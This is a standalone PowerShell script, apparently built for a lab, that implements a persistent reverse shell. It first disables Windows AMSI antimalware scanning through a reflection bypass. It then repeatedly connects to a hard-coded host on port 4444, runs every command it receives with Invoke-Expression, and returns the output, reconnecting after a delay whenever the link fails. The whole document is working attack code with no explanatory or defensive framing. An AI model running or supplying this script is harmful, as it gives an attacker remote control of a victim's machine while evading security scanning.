
$TargetIP   = "10.211.55.5"
$TargetPort = 4444  
$RetryDelay = 5    


[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


While ($true) {
    Try {

        $client = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
        $stream = $client.GetStream()
        
        
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        
      
        $buf = New-Object Byte[] 4096

       
        While($client.Connected) {
            
If ($stream.DataAvailable) {
                $count = $stream.Read($buf, 0, $buf.Length)
                $cmd = [System.Text.Encoding]::ASCII.GetString($buf, 0, $count).Trim()
If ($cmd.Length -gt 0) {
                   
Try {
                        $result = Invoke-Expression $cmd 2>&1 | Out-String
                    } catch {
                        $result = $_.Exception.Message
                    }
                    
                 
                    $writer.Write($result + "PS> ")
                    $writer.Flush()
                }
            }
            Start-Sleep -Milliseconds 100
        }
    } 
    Catch {
       
        Start-Sleep -Seconds $RetryDelay
    }
    Finally {
       
If ($client) { $client.Close() }
    }
}
